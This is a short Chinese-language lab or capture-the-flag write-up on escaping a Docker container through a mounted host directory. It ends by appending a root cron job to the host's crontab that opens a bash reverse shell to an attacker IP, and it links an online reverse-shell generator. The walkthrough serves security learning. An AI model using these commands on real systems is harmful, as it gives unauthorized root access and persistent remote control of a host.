Container escape to the host system

容器逃逸到主机系统

地址：http://192.168.86.139:1233/

查看目录以及标签，应该是需要从docker逃逸到真实机器

这个也类似于实战

在实战中：

1、判断当前shell权限\[如果不是root需要提权\]

2、判断当前是在k8s还是docker中

判断环境

![image-20231120172906719](./assets/image-20231120172906719.png)

发现是在docker

```sshell
mount \| grep '/ type'
```

![](./assets/image-20231120172910564.png)

 

一般在docker中逃逸分为

1、docker版本漏洞

2、宿主机漏洞

3、管理人员配置不当产生的漏洞

 

我们先使用第三种

第三种\[管理人员配置不当产生的漏洞\]：

1、特权启动

2、Docker Socket

3、procfs逃逸

4、目录挂载

 

这里我们从最简单的开始目录挂载\[输入以下命令\]

```shell
mount | grep 'type fuse'
Or
df -h
```

![image-20231120172922758](./assets/image-20231120172922758.png)

发现挂载目录是/host-system

![image-20231120172926719](./assets/image-20231120172926719.png)

 

得到真实机器命令，这里我们可以写入用户或者是反弹shell

 

```shell
cat /host-system/etc/crontab
```

![image-20231120172932299](./assets/image-20231120172932299.png)

生成在线反弹shell

[Online - Reverse Shell Generator (taoyuan.cool)](https://taoyuan.cool/shell/)

 

 

```shell
echo "\* \* \* \* \* root bash -i \>& /dev/tcp/192.168.86.218/3332 0\>&1" \>\>/host-system/etc/crontab
```

![image-20231120172939654](./assets/image-20231120172939654.png)

 

写入成功

![image-20231120172942919](./assets/image-20231120172942919.png)

 

拿到真实机器shell
